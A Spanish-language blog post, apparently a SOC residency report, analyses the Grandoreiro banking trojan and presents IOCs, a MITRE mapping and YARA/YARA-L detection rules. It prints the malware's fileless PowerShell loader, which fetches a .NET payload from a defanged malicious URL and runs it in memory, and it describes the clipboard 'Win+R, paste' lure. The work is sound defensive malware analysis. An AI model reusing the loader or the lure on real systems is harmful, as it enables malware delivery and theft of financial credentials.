---
layout: post
title: "Centro de Operaciones de Seguridad (SOC): Detección y Respuesta al Troyano Bancario Grandoreiro"
date: 2026-03-01
author: Eira Camila Arellano Peraza
categories: [ciberseguridad, malware, SOC, threat-intelligence]
tags: [grandoreiro, yara, yara-l, google-secops, banking-trojan, ioc, mitre-attack, delphi, powershell, fileless, latam]
---

> **Nota:** Este artículo documenta el trabajo técnico desarrollado durante una residencia profesional en la división de Security de Accenture SC (MxDR), realizada del 25 de agosto de 2025 al 25 de enero de 2026, en el marco del Instituto Tecnológico de Mérida (ITM).

---

## Resumen Ejecutivo

El **troyano bancario Grandoreiro** es una de las amenazas más activas y persistentes en el sector financiero y asegurador de Latinoamérica. Este proyecto desarrolló, dentro de un **Centro de Operaciones de Seguridad (SOC)**, un conjunto de mecanismos de detección basados en inteligencia de amenazas: reglas **YARA** para análisis de artefactos y una regla **YARA-L 2.0** integrada en **Google SecOps**. Las detecciones fueron validadas en entornos controlados sin generar falsos positivos, y la metodología es replicable para otras familias de malware similares.

---

## Abstract

The Grandoreiro banking Trojan represents one of the most significant threats to the financial and insurance sectors in Latin America due to its high capacity for evasion, persistence, and theft of sensitive information. This project was developed within the operational context of a Security Operations Center (SOC), applying threat analysis methodologies, collecting Indicators of Compromise (IOCs), and designing custom detection rules using YARA and YARA-L. The results demonstrated that the developed rules are specific, robust, and functional, without generating false positives during the evaluation period.

---

## 1. Introducción

### 1.1 Contexto

Las organizaciones del sector financiero y asegurador operan en un entorno digital altamente hostil. Los ciberdelincuentes actúan con una frecuencia **tres veces mayor** en este sector que en cualquier otro, motivados por el valor de los datos que estas instituciones almacenan: información personal, financiera y de salud.

Los **Centros de Operaciones de Seguridad (SOC)** apoyados en esquemas de **Detección y Respuesta Gestionada (MDR)** son herramientas clave para monitorear, correlacionar y responder a actividades maliciosas en tiempo real.

### 1.2 Justificación

En marzo de 2025, múltiples fuentes de ciberseguridad reportaron el resurgimiento del troyano bancario **Grandoreiro**, activo en campañas dirigidas contra instituciones financieras en México, distribuyéndose mediante correos de phishing que simulaban provenir del **SAT** (Servicio de Administración Tributaria) y la **CFE** (Comisión Federal de Electricidad). Datos de telemetría de Kaspersky posicionan a México entre los países más afectados por este malware durante 2024.

El desarrollo de este proyecto permitió robustecer las capacidades de detección y respuesta del SOC de una aseguradora, usando **Google SecOps**, **YARA** y **YARA-L**.

---

## 2. Objetivos

### Objetivo General

Fortalecer la postura de ciberseguridad en el sector asegurador mediante la investigación, análisis y desarrollo de mecanismos de detección de amenazas, con enfoque en el malware bancario y su aplicación en un SOC.

### Objetivos Específicos

- Investigar el panorama actual de amenazas cibernéticas que afectan al sector asegurador en Latinoamérica.
- Identificar las técnicas de distribución y persistencia del troyano Grandoreiro.
- Recopilar y analizar **Indicadores de Compromiso (IOCs)** vinculados a campañas activas.
- Crear reglas de detección basadas en **YARA** y **YARA-L** para identificar comportamientos maliciosos en Google SecOps.

---

## 3. Marco Teórico

### 3.1 Troyanos Bancarios

Los troyanos bancarios son programas maliciosos diseñados para robar información financiera confidencial: credenciales, números de cuenta, tokens de autenticación, etc. A diferencia de virus o gusanos, **requieren interacción del usuario** para ejecutarse, valiéndose del engaño.

Sus capacidades principales incluyen:

- **Keylogging**: registro de pulsaciones de teclado.
- **Screen capturing**: captura de pantallas en tiempo real.
- **Form grabbing**: interceptación de formularios web antes del cifrado HTTPS.
- **Web injection**: inyección de código malicioso en navegadores.
- **Comunicación C2**: instrucciones remotas desde servidores de Comando y Control.
- **Persistencia**: modificación del registro de Windows, tareas programadas.
- **Ejecución fileless**: operación en memoria sin dejar archivos en disco.

### 3.2 Panorama en Latinoamérica

Las familias de malware bancario más activas en la región incluyen:

| Familia       | Características destacadas                                         |
|---------------|---------------------------------------------------------------------|
| **Grandoreiro** | Desarrollado en Delphi; phishing, control remoto, alta evasión   |
| **Mekotio**   | Persistencia avanzada; afecta México, Chile, Perú                  |
| **Casbaneiro** | Infraestructura C2 compartida; técnicas anti-análisis             |
| **Guildma**   | Módulos especializados por país objetivo                           |

### 3.3 Indicadores de Compromiso (IOCs)

Los **IOCs** son evidencias técnicas que permiten identificar intrusiones o actividades maliciosas. Se clasifican en:

- **Host-based IOCs**: hashes de archivos (MD5, SHA-1, SHA-256), claves de registro, procesos sospechosos.
- **Network-based IOCs**: IPs, dominios C2, URLs, certificados digitales anómalos.

### 3.4 YARA y YARA-L

**YARA** (*Yet Another Ridiculous Acronym*) es un lenguaje de código abierto para identificar patrones en archivos, procesos o memoria. Su estructura básica:

```
rule Nombre_Regla {
    meta:
        author = "Analista"
        description = "Descripción"
    strings:
        $cadena1 = "patron_ascii" ascii nocase
        $hex1 = { 4D 5A 90 00 }
    condition:
        $cadena1 and $hex1
}
```

**YARA-L** es una extensión de YARA desarrollada para **Google SecOps (Chronicle)**, orientada al análisis de comportamiento y correlación de eventos en tiempo real dentro de grandes volúmenes de telemetría de seguridad.

### 3.5 Threat Intelligence

El ciclo de vida de la inteligencia de amenazas (CTI) se compone de seis etapas iterativas:

1. **Planeación** – Definición de objetivos de inteligencia.
2. **Recopilación** – Obtención de datos de múltiples fuentes.
3. **Procesamiento** – Limpieza, normalización y correlación.
4. **Análisis** – Identificación de patrones y tendencias.
5. **Difusión** – Integración en SIEM/SOAR.
6. **Retroalimentación** – Evaluación y ajuste del proceso.

**Herramientas utilizadas:**

- **MISP** – Plataforma para compartir y correlacionar IOCs entre organizaciones.
- **OpenCTI** – Modelado de actores de amenaza y relaciones.
- **VirusTotal** – Análisis de archivos, URLs y hashes con múltiples motores AV.
- **CyberChef** – Decodificación y análisis de artefactos.
- **Google SecOps** – SIEM/SOAR nativo en la nube con capacidades de YARA-L.

### 3.6 Marco MITRE ATT&CK

El marco **MITRE ATT&CK®** documenta las tácticas, técnicas y procedimientos (TTPs) utilizados por actores de amenaza. Las 14 tácticas principales para entornos empresariales son:

| # | Táctica                     | Propósito del atacante                            |
|---|-----------------------------|---------------------------------------------------|
| 1 | Reconocimiento               | Obtener información sobre la víctima              |
| 2 | Desarrollo de recursos       | Preparar herramientas e infraestructura           |
| 3 | Acceso inicial               | Lograr la intrusión en el sistema objetivo        |
| 4 | Ejecución                    | Ejecutar código malicioso o scripts               |
| 5 | Persistencia                 | Mantener el acceso tras la infección              |
| 6 | Escalamiento de privilegios  | Adquirir mayores permisos                         |
| 7 | Evasión de defensas          | Evitar la detección por mecanismos de seguridad   |
| 8 | Acceso a credenciales        | Obtener nombres de usuario y contraseñas          |
| 9 | Descubrimiento               | Explorar la red y sistemas comprometidos          |
|10 | Movimiento lateral           | Desplazarse entre sistemas                        |
|11 | Recopilación                 | Extraer información relevante                     |
|12 | Comando y Control (C2)       | Comunicación con la infraestructura atacante      |
|13 | Exfiltración                 | Sustraer datos de la organización                 |
|14 | Impacto                      | Alterar, destruir o cifrar sistemas/datos         |

---

## 4. Metodología

El proyecto se estructuró en cuatro fases secuenciales:

1. **Investigación del panorama de amenazas** – Estudio de reportes técnicos (IBM X-Force, ESET, Kaspersky), feeds OSINT y campañas activas en LATAM.
2. **Análisis técnico de Grandoreiro** – Estudio del ciclo de vida completo del malware.
3. **Recopilación de IOCs** – Extracción y validación desde MISP, OpenCTI, VirusTotal y sandbox propio.
4. **Desarrollo y validación de reglas de detección** – Creación de reglas YARA y YARA-L, pruebas en entorno controlado.

---

## 5. Análisis Técnico de Grandoreiro

### 5.1 Cadena de Infección

```
[Correo Phishing] → [ZIP/HTML malicioso] → [PowerShell/Portapapeles] 
    → [Descarga Payload .xls/.txt] → [Assembly::Load en memoria]
        → [Persistencia] → [Exfiltración] → [C2]
```

### 5.2 Vector de Entrega: Phishing con HTML Camuflado

El archivo analizado (`citatorio_urgente.pdf`) resultó ser un **archivo HTML camuflado** con las siguientes características técnicas:

| Atributo                    | Valor                                          |
|-----------------------------|------------------------------------------------|
| Tamaño                      | 48.33 KB (49,486 bytes)                        |
| Nivel de entropía           | 6.03 (indica posible contenido ofuscado)       |
| Primera detección VirusTotal | 15 de octubre de 2024                         |
| Lenguaje principal          | HTML + JavaScript ofuscado                     |

El archivo presentaba un **visor PDF falso** con filtro `filter: blur(4px)` y un popup que instruía al usuario a presionar `Windows + R`, luego `Ctrl + V` y `Enter`, bajo el pretexto de "resolver un problema del navegador".

### 5.3 Mecanismo de Ejecución: Portapapeles + PowerShell

El JavaScript embebido copiaba automáticamente al portapapeles un comando PowerShell codificado en Base64:

```powershell
powershell -EncodedCommand <BASE64_PAYLOAD>
```

Al decodificarlo, el comando descargaba y ejecutaba un archivo `.txt` desde una URL maliciosa:

```
https://d8f7ca[.]top/d1zK3flPWA/v.txt
```

Este archivo contenía el siguiente **loader fileless**:

```powershell
$bytes = (Invoke-WebRequest "hxxps://d8f7ca[.]top/d1zK3flPWA/oTq.xls" `
    -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where(
    { $_.Name -eq "Program" }, "First"
).GetMethod("Main", [Reflection.BindingFlags] "Static, Public, NonPublic")
$entryPointMethod.Invoke($null, $null)
exit
```

El script realizaba tres operaciones críticas:
1. Descargaba un ensamblado **.NET** disfrazado como archivo `.xls`.
2. Lo cargaba **directamente en memoria** mediante `Assembly::Load($bytes)`, sin escribir en disco.
3. Ejecutaba el método `Main` de la clase `Program` mediante **reflexión**.

### 5.4 Persistencia y Evasión

Grandoreiro garantiza su permanencia mediante:

- Creación de clave de registro: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` con nombre `RadeonSettings/Q-1`.
- Modificación de accesos directos (LNK) y tareas programadas.
- Cifrado y ofuscación de strings internos.
- Detección de entornos virtualizados o sandbox (anti-análisis).
- Archivos de configuración cifrados (`.cfg` en AppData, `.xml` en `C:\Public`).

### 5.5 Comunicación C2 y Exfiltración

Una vez activo, el malware:

- Captura pulsaciones de teclado, formularios y cookies del navegador.
- Toma capturas de pantalla y las envía cifradas via HTTPS.
- Genera dominios dinámicamente mediante un **algoritmo DGA** (Domain Generation Algorithm), usando la semilla `xretsmzrb`.
- Utiliza dominios apex como `dnsfor.me` y `neat-url.com`.
- Manipula clientes de correo Outlook para recolectar contactos y propagar spam.

### 5.6 Mapeo MITRE ATT&CK

| Táctica MITRE              | Técnica Observada                                  | ID         |
|----------------------------|----------------------------------------------------|------------|
| Ejecución                  | Comandos codificados en PowerShell                 | T1059.001  |
| Persistencia               | Modificación del registro / tareas programadas     | T1547      |
| Evasión de defensa         | Ofuscación de código y detección de sandbox        | T1027      |
| Acceso a credenciales      | Captura de formularios y keylogging                | T1056      |
| Comando y Control          | Comunicación cifrada con dominios dinámicos        | T1071      |

---

## 6. Recopilación de IOCs

Los IOCs fueron extraídos de **MISP**, **OpenCTI**, **VirusTotal** y análisis en sandbox, priorizando infraestructura activa de 2024–2025.

### Hashes SHA-256 (muestra representativa)

```
1181812f90bbd0f26dc1fcd94123903c8099a874c2274d5074a38eda867ef749
0036a7bc497d945b068cb1297bedccb0ae16727b20a5864b22e25865aae56c5a
63c7b581b96cdd8178ff8e31338743b46badfe732f0e6b98ae3a4725140bd5b1
85fbca87332601b9beadc3dbff58cf245f7ee768e2ca88d79d2f349e04164113
```

### URLs Maliciosas

```
hxxps://d8f7ca[.]top/d1zK3flPWA/oTq.xls
hxxps://d8f7ca[.]top/d1zK3flPWA/v.txt
hxxps://d8f7ca[.]top/d1zK3flPWA/auOqPK.xls
hxxps://d8f7ca[.]top/d1zK3flPWA/post.php
```

### Dominios C2

```
d8f7ca[.]top
support-whitelist-ledger[.]com
bitpaymentspro[.]top
diplomu-goznak[.]top
pendlebuilder[.]com
ledgeir-wallet[.]com
178492-coinbase[.]com
contaboserver[.]net
```

### Direcciones IP

```
64[.]95[.]11[.]29
58[.]64[.]137[.]69
5[.]189[.]171[.]211
207[.]180[.]209[.]104
18[.]212[.]216[.]95
```

**Total de IOCs recopilados:** 57 hashes SHA-256, 34 dominios C2, 18 IPs, 12 URLs.

---

## 7. Desarrollo de Reglas de Detección

### 7.1 YARA 1 — `HTML_Phishing_Clipboard_Powershell`

Detecta plantillas HTML maliciosas que copian comandos PowerShell al portapapeles e inducen al usuario a ejecutarlos. Orientada a campañas que distribuyen archivos con nombres como "Citatorio SAT", "Factura Digital" o "Comprobante Pendiente".

```yara
rule HTML_Phishing_Clipboard_Powershell
{
    meta:
        author      = "SOC Analyst - Proyecto Grandoreiro"
        description = "HTML que fuerza ejecución de payload remoto via PowerShell"
        date        = "2025-11-17"
        tlp         = "RED"
        confidence  = "high"

    strings:
        $clipboard = "navigator.clipboard.writeText" ascii nocase
        $encoded   = "powershell -EncodedCommand"    ascii nocase
        $b64frag   = "aQBlAHgA"                      ascii nocase
        $winr      = "Windows + R"                   ascii nocase
        $ctrlc     = "CTRL + C"                      ascii nocase
        $ctrlv     = "CTRL + V"                      ascii nocase
        $blur      = "filter: blur("                 ascii nocase

    condition:
        $clipboard and
        (
            ( $encoded and ($winr or $ctrlv or $ctrlc) ) or
            ( $b64frag and $blur )
        )
}
```

**Lógica de detección:**

| Identificador       | Propósito          | Significado                                                     |
|---------------------|--------------------|-----------------------------------------------------------------|
| `$clipboard`        | JavaScript         | Copia texto al portapapeles para preparar el comando PowerShell |
| `$encoded`          | PowerShell         | `-EncodedCommand` indica ejecución encubierta                   |
| `$b64frag`          | Base64             | Fragmento típico de payload UTF-16LE                            |
| `$winr`, `$ctrlv`, `$ctrlc` | Ingeniería social | Instrucciones inducidas al usuario                |
| `$blur`             | UI fraudulenta     | Capa borrosa para simular "error" del navegador                 |

**Resultados de prueba:** En un directorio con 6 archivos HTML (1 malicioso + 5 benignos), la regla detectó **únicamente el archivo malicioso**. Al agregar un archivo de prueba `dummy_yara.html` con las cadenas requeridas, se detectaron correctamente **2 coincidencias**, sin falsos positivos.

---

### 7.2 YARA 2 — `PowerShell_Grandoreiro_Fileless_Loader`

Detecta loaders fileless escritos en PowerShell que descargan ensamblados .NET remotos y los ejecutan directamente en memoria.

```yara
rule PowerShell_Grandoreiro_Fileless_Loader
{
    meta:
        author         = "SOC Analyst - Proyecto Grandoreiro"
        description    = "Detecta loaders fileless en PowerShell que descargan payloads remotos y ejecutan ensamblados .NET en memoria mediante Assembly::Load"
        last_modified  = "2025-11-20"
        malware_family = "Grandoreiro / LATAM Banking Trojan"
        tlp            = "AMBER"
        confidence     = "high"

    strings:
        /* Descarga remota */
        $req1     = "Invoke-WebRequest"                  ascii nocase
        $req2     = "-UseBasicParsing"                   ascii nocase
        $req3     = "Content"                            ascii nocase
        $ext_xls  = ".xls"                               ascii nocase
        $ext_txt  = "v.txt"                              ascii nocase
        $http_obs = "d8f7ca.top"                         ascii nocase

        /* Carga de ensamblado en memoria */
        $asm1 = "System.Reflection.Assembly]::Load"     ascii nocase
        $asm2 = "Assembly]::Load("                      ascii nocase
        $asm3 = "GetTypes()"                             ascii nocase
        $asm4 = "GetMethod(\"Main\""                    ascii nocase

        /* Ejecución del método de entrada */
        $inv1 = "Invoke($null,$null)"                   ascii nocase
        $inv2 = "entryPointMethod"                      ascii nocase
        $inv3 = "Invoke("                               ascii nocase

        /* Indicador de finalización */
        $exit = "\nexit"                                ascii nocase

    condition:
        ( $req1 or $req2 or $req3 or $ext_xls or $ext_txt or $http_obs )
        and
        ( $asm1 or $asm2 or $asm3 or $asm4 )
        and
        ( $inv1 or $inv2 or $inv3 )
        and
        $exit
}
```

**Lógica de detección:**

| Identificador              | Propósito           | Significado                                                    |
|----------------------------|---------------------|----------------------------------------------------------------|
| `$req1`, `$req2`, `$req3`  | Descarga remota     | `Invoke-WebRequest`, parámetros y acceso a contenido           |
| `$ext_xls`, `$ext_txt`     | Payload             | Extensiones usadas para ocultar ensamblados .NET               |
| `$http_obs`                | Dominio asociado    | Dominio observado en campañas activas de Grandoreiro           |
| `$asm1`, `$asm2`           | Carga en memoria    | `Assembly::Load` sin escribir en disco                         |
| `$asm3`, `$asm4`           | Reflexión           | Obtención dinámica de tipos y métodos (`GetTypes`, `GetMethod`)|
| `$inv1`, `$inv2`, `$inv3`  | Ejecución           | Invocación del método `Main` del payload                       |
| `$exit`                    | Flujo del script    | Comando `exit` característico de estos loaders                 |

**Resultados de prueba:** Directorio con `v.txt` (malicioso) + varios archivos TXT benignos → detección **solo del archivo malicioso**. Al agregar `loader_stage1.txt` (simulado), se detectaron correctamente **2 coincidencias**.

---

### 7.3 YARA-L — `template_adversary_behavior_rule_grandoreiro_ext`

Regla compuesta para **Google SecOps (YARA-L 2.0)** que abarca toda la cadena de operación de Grandoreiro: persistencia, loader Delphi, DGA, harvesting de Outlook y cifrado interno.

```yara
rule template_adversary_behavior_rule_grandoreiro_ext
{
    meta:
        author          = "Accenture MxDR - Eira Camila Arellano Peraza"
        description     = "Detección compuesta para Grandoreiro: persistencia, loader Delphi, DGA seeds, Outlook harvesting, ElAES/AES markers"
        severity        = "High"
        priority        = "High"
        reference       = "https://www.ibm.com/think/x-force/grandoreiro-banking-trojan-unleashed"
        ruleset         = "Adversary Behavior: Persistence / Defense Evasion / C2"
        mitre_tactic    = "TA0003, TA0005, TA0011"
        mitre_technique = "T1547.001, T1140, T1105"

    events:
        // 1) Persistencia - Run key
        (
            $event.metadata.event_type >= "REGISTRY_CREATION" and
            $event.metadata.event_type <= "REGISTRY_MODIFICATION" and
            $event.target.registry.registry_key =
                /HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/ nocase and
            $event.target.registry.registry_value_name = /RadeonSettings\/Q-1/ nocase
        )
        or
        // 2) Artefactos del loader (CFG/XML)
        (
            $event.target.file.full_path = /\\Users\\.*\\AppData\\.*\\.cfg/ nocase or
            $event.target.file.full_path = /C:\\Public\\.*\\.xml/ nocase
        )
        or
        // 3) Loader Delphi
        (
            $event.target.process.command_line =
                /Borland|TMemoryStream|VirtualAlloc/ nocase
        )
        or
        // 4) DGA seeds
        (
            any $event.network.dns.questions.name =
                /(dnsfor|neat-url)\.(com|me)/ nocase or
            $event.target.process.command_line = /xretsmzrb/ nocase
        )
        or
        // 5) Outlook harvesting
        (
            $event.target.process.command_line =
                /CLIENT_SOLICITA_DD_EMSOUT|COLHENDO|Namespace\.AddStore/ nocase
        )
        or
        // 6) Cifrado interno (ElAES/AES)
        (
            $event.target.process.command_line = /ElAES|AES.?ECB/ nocase
        )

        $threat_signature = strings.coalesce(
            $event.security_result.threat_name,
            $event.additional.fields["signature"],
            "grandoreiro_composite_behavior_detected"
        )
        $targeted_host = strings.to_upper(strings.coalesce(
            $event.target.hostname, $event.principal.hostname
        ))

    match:
        $targeted_host over 15m

    outcome:
        $risk_score = max(80)
        $threat_signature_list = array_distinct($threat_signature)
        $targeted_host_list = array_distinct($targeted_host)

    condition:
        $event
}
```

**Indicadores cubiertos por la regla:**

| Indicador                                         | Fase              | Significado                                                    |
|---------------------------------------------------|-------------------|----------------------------------------------------------------|
| `RadeonSettings/Q-1` (Run key)                    | Persistencia      | Clave Run usada para ejecutarse en cada inicio                 |
| `.cfg` en AppData                                 | Artefacto loader  | Configuración cifrada con fecha de infección                   |
| `.xml` en `C:\Public`                             | Artefacto         | Archivo cifrado con datos del ejecutable y perfil de víctima   |
| `Borland`, `TMemoryStream`, `VirtualAlloc`        | Loader Delphi     | Indicadores del empaquetador e inyección de memoria            |
| `dnsfor.me`, `neat-url.com`                       | DGA               | Dominios apex generados por el algoritmo DGA                   |
| `xretsmzrb`                                       | Seed DGA          | Semilla principal para generación de dominios                  |
| `CLIENT_SOLICITA_DD_EMSOUT`, `COLHENDO`           | Outlook harvesting| Cadenas de exfiltración y spam automatizado                    |
| `Namespace.AddStore`                              | Outlook           | Incorporación de PSTs para extracción de contactos             |
| `ElAES`, `AES ECB`                                | Cifrado interno   | Algoritmo usado para ocultar strings y configuraciones         |

---

## 8. Resultados

### 8.1 Investigación del Panorama de Amenazas

La investigación identificó las siguientes tendencias en el sector asegurador de LATAM:

- **Incremento de campañas de phishing** con plantillas HTML que copian comandos PowerShell al portapapeles (técnica *ClickFix*).
- Según **IBM X-Force 2025**, el 42% de los PDFs maliciosos analizados contenían URLs ofuscadas, el 28% las ocultaban en flujos internos del PDF, y el 7% eran distribuidos cifrados.
- **AgentTesla**, **FormBook**, **SnakeKeylogger** y **PureLogs Stealer** fueron los infostealers más distribuidos en 2024.
- Grandoreiro reapareció activamente en **marzo de 2025**, suplantando al SAT y a la CFE en México.

### 8.2 Resumen de Entregables

| Entregable                              | Descripción                                              |
|-----------------------------------------|----------------------------------------------------------|
| Repositorio de IOCs                     | 57 hashes, 34 dominios, 18 IPs, 12 URLs validados        |
| Regla YARA 1                            | Detección de HTML phishing con portapapeles              |
| Regla YARA 2                            | Detección de loader fileless PowerShell                  |
| Regla YARA-L                            | Detección compuesta en Google SecOps                     |
| Matriz MITRE ATT&CK                     | TTPs documentados de Grandoreiro                         |
| Procedimiento metodológico              | Replicable para otras familias de malware                |

### 8.3 Validación

- Las reglas **YARA** detectaron correctamente todos los artefactos maliciosos sin falsos positivos en archivos benignos.
- La regla **YARA-L** fue evaluada durante **dos semanas** en Google SecOps sin generar alertas inesperadas (0 falsos positivos).
- La sintaxis y estructura UDM fueron verificadas en el **Rule Editor** de Google SecOps.

---

## 9. Conclusiones

El proyecto demostró que es posible desarrollar mecanismos de detección **específicos, robustos y operativamente viables** para el troyano bancario Grandoreiro dentro de un SOC corporativo, utilizando herramientas de inteligencia de amenazas y plataformas SIEM modernas como Google SecOps.

Los hallazgos principales son:

1. **Grandoreiro es una amenaza activa y en evolución** que combina ingeniería social, ejecución fileless, algoritmos DGA y módulos especializados para evadir detecciones tradicionales.
2. El enfoque basado en **comportamiento** (YARA-L) es superior al basado en firmas estáticas para amenazas que evolucionan continuamente.
3. La metodología desarrollada es **replicable** para otras familias de malware bancario en LATAM (Mekotio, Casbaneiro, Guildma).
4. La integración de **IOCs validados** desde múltiples fuentes reduce significativamente los falsos positivos.

---

## 10. Recomendaciones

- **Implementar de forma permanente** las reglas YARA-L en los flujos de monitoreo del SOC.
- **Automatizar la ingestión de IOCs** desde fuentes OSINT y comerciales hacia Google SecOps para detección de nuevas variantes.
- **Establecer revisiones periódicas** de las reglas de detección para adaptarlas a la evolución de Grandoreiro y amenazas emergentes.
- **Reforzar controles en el vector phishing**, dado que sigue siendo el principal mecanismo de distribución.
- **Implementar políticas de concienciación** para usuarios sobre la técnica *ClickFix* (portapapeles + PowerShell).
- Considerar la **detección proactiva (Threat Hunting)** usando los seeds DGA documentados (`xretsmzrb`, `dnsfor.me`, `neat-url.com`).

---

## 11. Tecnologías y Herramientas

### Plataformas de Threat Intelligence

- **MISP** – Malware Information Sharing Platform
- **OpenCTI** – Open Cyber Threat Intelligence
- **VirusTotal** – Análisis de archivos, URLs y hashes
- **IBM X-Force** – Informes de inteligencia de amenazas

### Herramientas de Análisis

- **CyberChef** – Decodificación de Base64 y análisis de artefactos
- **YARA** – Identificación de patrones en archivos y memoria
- **YARA-L 2.0** – Detección de comportamiento en Google SecOps

### Plataformas SOC

- **Google SecOps (Chronicle)** – SIEM/SOAR nativo en la nube
- **MITRE ATT&CK Navigator** – Mapeo de TTPs adversariales

### Entornos de Prueba

- **Kali Linux** – Entorno de pruebas controlado
- **Sandbox aislado** – Análisis sin riesgo para infraestructura productiva

---

## 12. Referencias

1. T. Wall y J. Rodrick, *Jump-start Your SOC Analyst Career*. Berkeley, CA: Apress, 2024.
2. MITRE ATT&CK, "Grandoreiro (S0531)". [https://attack.mitre.org/software/S0531/](https://attack.mitre.org/software/S0531/)
3. E. Ozkaya, *Practical Cyber Threat Intelligence*. BPB Publications, 2022.
4. Accenture, "El valor 360° está en el centro de nuestro negocio". [https://www.accenture.com/mx-es/about/company-index](https://www.accenture.com/mx-es/about/company-index)
5. D. Ghelani et al., "Cyber Security Threats, Vulnerabilities, and Security Solutions Models in Banking", 2022.
6. M. Sikorski y A. Honig, *Practical Malware Analysis*. No Starch Press, 2012.
7. P. Paganini, "Crooks are reviving the Grandoreiro banking trojan". Security Affairs, 2025.
8. YARA Documentation, "Writing YARA rules". [https://yara.readthedocs.io/en/stable/writingrules.html](https://yara.readthedocs.io/en/stable/writingrules.html)
9. Google Cloud, "Sintaxis del lenguaje YARA-L 2.0". [https://cloud.google.com/chronicle/docs/detection/yara-l-2-0-syntax](https://cloud.google.com/chronicle/docs/detection/yara-l-2-0-syntax)
10. IBM X-Force, *2025 Threat Intelligence Index*.
11. Kaspersky GReAT, "Grandoreiro, el troyano global con metas grandiosas". [https://securelist.lat/grandoreiro-banking-trojan](https://securelist.lat/grandoreiro-banking-trojan)
12. M. Frydrych et al., "IBM X-Force Threat Analysis: Hive0148 observed targeting Mexico and Costa Rica". [https://www.ibm.com/think/x-force/ibm-x-force-threat-analysis-hive0148-observed-targeting-mexico-costa-rica](https://www.ibm.com/think/x-force/ibm-x-force-threat-analysis-hive0148-observed-targeting-mexico-costa-rica)

